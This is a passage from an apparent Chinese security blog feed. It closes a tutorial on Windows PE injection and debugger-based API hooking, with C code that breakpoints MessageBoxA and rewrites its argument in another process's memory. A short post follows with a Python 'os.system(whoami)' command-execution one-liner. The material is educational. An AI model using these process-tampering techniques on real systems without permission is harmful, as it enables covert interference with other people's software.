获取线程上下文</span></span><br><span class="line">            ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">            GetThreadContext(g_cpdi.hThread, &amp;ctx);</span><br><span class="line">            <span class="comment">// 3. 更改参数值</span></span><br><span class="line">            ReadProcessMemory(g_cpdi.hProcess, (LPCVOID)(ctx.Esp + <span class="number">12</span>), &amp;titleAddr, <span class="keyword">sizeof</span>(SIZE_T), <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;[-] ESP地址：%ph\n&quot;, ctx.Esp);</span></span><br><span class="line">            <span class="comment">//printf(&quot;[-] MSG函数参数为：%x\n&quot;, &amp;titleAddr);</span></span><br><span class="line">            DWORD dwOldProtect;</span><br><span class="line">            VirtualProtectEx(g_cpdi.hProcess, (LPVOID)titleAddr, <span class="number">7</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">            WriteProcessMemory(g_cpdi.hProcess, (LPVOID)titleAddr, (LPVOID)title, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">            VirtualProtectEx(g_cpdi.hProcess, (LPVOID)titleAddr, <span class="number">7</span>, dwOldProtect, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">// 4. 还原EIP指针</span></span><br><span class="line">            ctx.Eip = (SIZE_T)procAddr;</span><br><span class="line">            SetThreadContext(g_cpdi.hThread, &amp;ctx);</span><br><span class="line">            Sleep(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 5. 恢复运行进程</span></span><br><span class="line">            ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);</span><br><span class="line">            <span class="comment">// 6. Hook</span></span><br><span class="line">            WriteProcessMemory(g_cpdi.hProcess, procAddr, &amp;intOpcode, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DebugLoop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    PROC procAddr = GetProcAddress(LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 已附加到程序！\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Hook API地址：%ph\n&quot;</span>, procAddr);</span><br><span class="line">    DEBUG_EVENT de;     <span class="comment">//调试事件</span></span><br><span class="line">    <span class="comment">//等待调试事件的发生</span></span><br><span class="line">    <span class="keyword">while</span> (WaitForDebugEvent(&amp;de, INFINITE)) &#123;<span class="comment">//等待调试信息，收到调试信息立即返回进入循环</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 被调试进程生成或附加事件,被调试进程启动或者附加时执行</span></span><br><span class="line">        <span class="keyword">if</span> (CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode) &#123;</span><br><span class="line">            InstallHook(procAddr, &amp;de);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//异常事件调试，负责处理INT3中断事件</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode) &#123;</span><br><span class="line">            Hook(procAddr, &amp;de);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//被调试进程终止事件，进程中止后，调试器也结束</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//再次运行被调试者</span></span><br><span class="line">        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-写在最后"><a href="#5-写在最后" class="headerlink" title="5 写在最后"></a>5 写在最后</h2><p>这是一篇入门性质的文章，列举了Windows系统中的一些安全问题。我在写这篇文章之前惊奇的发现我做的这些实验竟然都在《逆向工程核心原理》一书中的前几章中提到了，所以就把这4部分放在一起做了总结。<br>第一篇文章，写的很仓促很潦草，如果有任何错误和遗漏恳请大家的指正和补充。</p><h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6 参考"></a>6 参考</h2><ul><li><a href="https://github.com/Antonin-Deniau/cave_miner">https://github.com/Antonin-Deniau/cave_miner</a></li><li><a href="https://github.com/HackerajOfficial/injectAllTheThings">https://github.com/HackerajOfficial/injectAllTheThings</a></li><li><a href="https://github.com/ctxis/DLLHSC">https://github.com/ctxis/DLLHSC</a></li><li>kn0sky的博客：<a href="https://www.kn0sky.com/?p=31">https://www.kn0sky.com/?p=31</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-PE注入&quot;&gt;&lt;a href=&quot;#1-PE注入&quot; class=&quot;headerlink&quot; title=&quot;1 PE注入&quot;&gt;&lt;/a&gt;1 PE注入&lt;/h2&gt;&lt;p&gt;PE注入就是对静态的PE文件进行修改，使其在运行时能够加载我们需要的构造的代码。因为都是对文件进行静态的修改</summary>
      
    
    
    
    <category term="Windows" scheme="http://reop.cc/categories/Windows/"/>
    
    
  </entry>
  
  <entry>
    <title>The-First-Post</title>
    <link href="http://reop.cc/2023/10/24/The-First-Post/"/>
    <id>http://reop.cc/2023/10/24/The-First-Post/</id>
    <published>2023-10-24T11:28:31.000Z</published>
    <updated>2023-10-24T13:19:03.472Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>2023年10月24日，第一篇博客。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><img src=The-First-Post/1.jpg width=60% />]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;headerlink&quot; title=&quot;开始&quot;&gt;&lt;/a&gt;开始&lt;/h2&gt;&lt;p&gt;2023年10月24日，第一篇博客。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
      
    
    
    
    
    <category term="杂" scheme="http://reop.cc/tags/%E6%9D%82/"/>
    
  </entry>
  
</feed>
